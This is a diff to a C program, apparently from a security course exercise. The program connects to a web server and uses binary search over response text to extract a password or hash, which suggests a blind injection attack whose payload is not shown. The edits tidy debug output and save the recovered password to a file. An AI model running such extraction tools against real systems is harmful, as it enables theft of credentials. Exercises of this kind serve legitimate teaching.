@@ -1,4 +1,3 @@
-#define __MY_DEBUG__
 #include <limits.h>
 #include <string.h>
 #include <stdint.h>
@@ -194,10 +193,6 @@ bool recv_empty(int32_t sockfd) {
     size = size + recvd;
 
     const char *ptr = strstr(buf, "Your order has been sent!");
-
-    #ifdef __MY_DEBUG__
-        //puts(buf);
-    #endif
 
     free(buf);
 
@@ -519,6 +514,12 @@ void binary_search(check_func_t check_fn, void *ctx) {
 #endif
 }
 
+void write_to_file(const char *const filename, const char *const s) {
+    FILE *file_ptr = fopen(filename, "w");
+    fprintf(file_ptr, "*%s*", s);
+    fclose(file_ptr);
+}
+
 int32_t main() {
     int32_t sockfd = create_socket();
     _connect(sockfd, WEB_ADDR, 80);
@@ -594,8 +595,11 @@ int32_t main() {
         };
         binary_search(check_password, &pwd_ctx);
     }
-
+#ifdef __MY_DEBUG__
     printf("Found Password/Hash: %s\n", final_password);
+#endif
 
     close(sockfd);
+
+    write_to_file("322695107.txt", final_password);
 }
